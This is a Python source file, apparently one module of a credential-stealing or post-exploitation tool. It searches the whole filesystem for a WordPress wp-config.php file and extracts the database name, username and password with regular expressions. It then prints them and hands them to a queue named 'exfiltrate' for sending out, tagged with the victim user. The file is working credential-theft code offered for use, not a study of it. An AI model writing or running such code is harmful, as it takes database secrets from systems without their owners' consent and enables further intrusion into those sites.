import os
import re
from queue import Queue
from ..helper import extract_string

def get_path(f_name):
    f_path = False
    breaker = False
    try:
        for root, dirs, files in os.walk('/',topdown=True):
            for name in files:
                if name == f_name:
                    f_path = os.path.abspath(os.path.join(root, name))
                    breaker = True 
                    return f_path
            if breaker:
                break   
    except:
        pass
    return f_path   

def get_db_creds(f_path):
    db_creds = dict()
    try:
        t_file = open(f_path, "r")
        data = t_file.read()
        t_file.close()
        db_user_hit = re.search("%s" % '.*DB_USER.*', data)
        db_pw_hit = re.search("%s" % '.*DB_PASSWORD.*', data)
        db_name_hit = re.search("%s" % '.*DB_NAME.*', data)
        if db_user_hit and db_pw_hit and db_name_hit:
            user_line = db_user_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            db_creds['user'] = hit[1]
            user_line = db_pw_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            db_creds['pw'] = hit[1]
            user_line = db_name_hit.group()
            hit = re.findall("%s" % "'(.*?)'", user_line)    
            db_creds['name'] = hit[1]
            return db_creds
        else:
            return None
    except:
        return None

def get_wp_db_creds(exfiltrate: Queue, user):
    config_path = get_path('wp-config.php')
    if config_path:
        db_creds = get_db_creds(config_path)
        if db_creds:
            print(f"[WORDPRESS] DB Name: {db_creds['name']} Creds: {db_creds['user']}:{db_creds['pw']}")
            extract_string(exfiltrate, f"[{user}] - [WORDPRESS] DB Name: {db_creds['name']} Creds: {db_creds['user']}:{db_creds['pw']}")
            return db_creds
        else:
            extract_string(exfiltrate, f"[{user}] - [WORDPRESS] No DB Creds found")
    return None
